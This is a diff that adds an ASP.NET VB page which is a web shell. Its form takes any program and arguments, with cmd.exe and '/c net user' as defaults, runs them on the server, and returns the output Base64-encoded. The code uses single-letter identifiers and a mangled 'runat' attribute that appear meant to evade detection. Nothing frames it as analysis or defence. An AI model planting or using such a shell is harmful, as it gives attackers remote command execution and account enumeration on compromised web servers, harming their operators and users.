@@ -1,0 +1,44 @@
+<%@ Page Language="VB" Debug="true" %>
+<%@ import Namespace="System.IO" %>
+<%@ import Namespace="System.Diagnostics" %>
+<%@ import Namespace="System.Text" %>
+
+<script runat="tttp">      
+
+Sub a(Src As Object, E As EventArgs)            
+    ' Initialize the process
+    Dim b As New Process()            
+    Dim c As New ProcessStartInfo(d.Text)            
+    c.UseShellExecute = False            
+    c.RedirectStandardOutput = True            
+    b.StartInfo = c            
+    c.Arguments = e.Text            
+    b.Start()            
+
+    ' Read the output of the command
+    Dim f As StreamReader = b.StandardOutput            
+    Dim g As String = f.ReadToEnd()            
+    b.Close()            
+
+    ' Encode the output to Base64
+    Dim h As Byte() = Encoding.UTF8.GetBytes(g)
+    Dim i As String = Convert.ToBase64String(h)
+
+    ' Display the result
+    j.Text = vbCrLf & "<pre>" & i & "</pre>"    
+End Sub
+
+</script>
+
+<html>
+<body>    
+<form runat="tttp">        
+    <p><asp:Label id="L_1" runat="tttp" width="80px">Program</asp:Label>        
+    <asp:TextBox id="d" runat="tttp" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
+    <p><asp:Label id="L_2" runat="tttp" width="80px">Arguments</asp:Label>        
+    <asp:TextBox id="e" runat="tttp" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
+    <p><asp:Button id="Btn_1" onclick="a" runat="tttp" Width="100px" Text="Run"></asp:Button>        
+    <p><asp:Label id="j" runat="tttp"></asp:Label>       
+</form>
+</body>
+</html>
